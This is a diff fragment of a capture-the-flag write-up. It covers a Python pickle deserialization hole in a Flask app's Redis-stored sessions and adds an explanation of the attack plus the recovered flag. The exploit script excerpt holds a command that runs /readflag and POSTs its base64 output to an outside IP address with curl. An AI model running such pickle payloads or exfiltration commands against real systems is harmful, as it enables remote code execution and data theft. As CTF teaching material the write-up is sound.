@@ -203,7 +203,7 @@ $ redis-cli
 127.0.0.1:6379> GET "bookhub:session:0c14aa8d-f405-4166-841a-04422ad2d6f6"
 "\x80\x03}q\x00(X\n\x00\x00\x00_permanentq\x01\x88X\x06\x00\x00\x00_freshq\x02\x89X\n\x00\x00\x00csrf_tokenq\x03X(\x00\x00\x00a9bcf95844a0bfa0a217cd95b23a174472d780d8q\x04u."
 ```
-This looks like a pickle serialized python object. You can easily identify a serialized pickle with the `\x80\x03` at the start. This points to your typical pickle deserialization vuln. 
+This looks like a pickle serialized python object. You can easily identify a serialized pickle with the `\x80\x03` at the start. This points to your typical pickle deserialization vuln. The server stores our session as data as a serialized object and if we can control it, we can make it deserialize a malicious pickle object which runs our code.
 
 I wrote a quick script which changed my sessionID to valid lua, refreshed my CSRF token and then sent a POST request to "/admin/system/refresh_session/" endpoint (to store the code). 
 
@@ -218,6 +218,8 @@ import pickle
 import os
 import sys
 import base64
+
+#rwctf{fl45k_1s_a_MAg1cal_fr4mew0rk_t0000000000}
 
 COMMAND = '/usr/bin/curl -X POST "http://199.247.28.91/hacked" -d "$(/readflag|base64)"'
 
